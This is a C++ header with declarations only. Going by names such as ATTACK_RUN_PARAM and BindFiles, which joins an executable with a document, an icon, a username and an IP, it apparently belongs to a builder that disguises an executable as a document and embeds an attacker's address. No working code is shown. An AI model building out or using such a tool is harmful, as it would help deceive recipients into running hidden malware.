#pragma once

#include <iostream>
#include <string>

using namespace std;

#pragma  pack(1)

typedef struct  
{
	char username[16];
	char ip[16];

}ATTACK_RUN_PARAM,*LPATTACK_RUN_PARAM;


#pragma pack()



unsigned int GetCryptKey(unsigned char * pKey);
void CryptData(unsigned char * pdata, int size, unsigned char * pkey, int keylen);
int MyCopyFile(const char * szsrcfile, const char * szdstfile);
int fileReader(const char * fn, char ** lpbuf, int * filesize);
int BindFiles(string exefn, string docfn, string icofn, string mainname, string surfixname, string username,string ip,int id,string path);
int OpenFileName(HWND hwnd, int id);
int __stdcall DlgMain(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);